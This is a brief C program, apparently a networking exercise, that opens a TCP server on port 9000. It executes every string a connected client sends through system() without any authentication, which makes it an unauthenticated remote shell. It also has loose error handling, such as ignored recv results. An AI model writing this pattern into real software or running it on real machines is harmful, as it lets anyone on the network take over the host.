#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<string.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<unistd.h>
int main()
{
    int connfd,listenfd;
    int buffsize=1024;
    char buffer[1024]={0};
    struct sockaddr_in servaddr,cliaddr;

    if((listenfd=socket(AF_INET,SOCK_STREAM,0))<0)
        perror("socket");
    printf("Created Socket\n");
    servaddr.sin_family=AF_INET;
    servaddr.sin_port=htons(9000);
    servaddr.sin_addr.s_addr=INADDR_ANY;

    if(bind(listenfd,(struct sockaddr*)&servaddr,sizeof(servaddr))<0)
    {
        perror("bind");
        exit(0);
    }
    printf("Binded Socket\n");
    if(listen(listenfd,3)<0)
    {
        perror("listen");
        exit(0);
    }

    printf("Listening at %s : %d\n",inet_ntoa(servaddr.sin_addr),servaddr.sin_port);
    int addrlen=sizeof(struct sockaddr_in);
    if((connfd=accept(listenfd,(struct sockaddr*)&cliaddr,&addrlen))<0)
    {
        perror("accept");
        exit(0);
    }
    printf("accepted connection from %s\n",inet_ntoa(cliaddr.sin_addr));
    while(1)
    {
        memset(buffer,0,sizeof(buffer));
        recv(connfd,buffer,sizeof(buffer),0);

        printf("Command Requested : %s\n",buffer);

        system(buffer);
        char ret[]="Execution successfull\n";
        send(connfd,ret,sizeof(ret),0);
    }

    close(connfd);
    close(listenfd);
    exit(0);


}